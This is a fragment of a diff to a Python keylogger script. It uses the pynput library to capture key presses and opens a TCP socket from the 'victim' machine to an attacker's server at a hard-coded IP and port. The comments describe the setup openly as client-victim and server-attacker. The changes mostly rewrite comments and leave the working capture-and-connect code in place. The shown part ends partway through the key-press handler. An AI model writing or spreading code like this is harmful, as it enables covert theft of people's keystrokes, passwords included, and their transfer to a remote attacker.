@@ -2,13 +2,15 @@ from pynput import keyboard                     # pynput libray is used to monit
 
 import socket                                   # socket library is used to establish the connection between the client(victim) and server(attacker)
 
-attacker_address=('192.1.1.1',8000)               # change ip address of server/attacker
+attacker_address=('192.1.1.1',8000)             # change ip address of server/attacker
 
-victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
+victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # we have to close the socket manually in this case as we are not using "with" statement
                                                 
-# AF_INET for ipv4 and SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)
+                                                # AF_INET for ipv4 
+                                                # SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)
 
-victim_socket.connect(attacker_address)
+victim_socket.connect(attacker_address)         # connect to the attacker's ip address and port number
+
 def press(key):                                 # function to monitor the key press event
     try:
         print(" clicked {}",format(key.char))   # to print which key is pressed only if it is a character(alphanumeric)
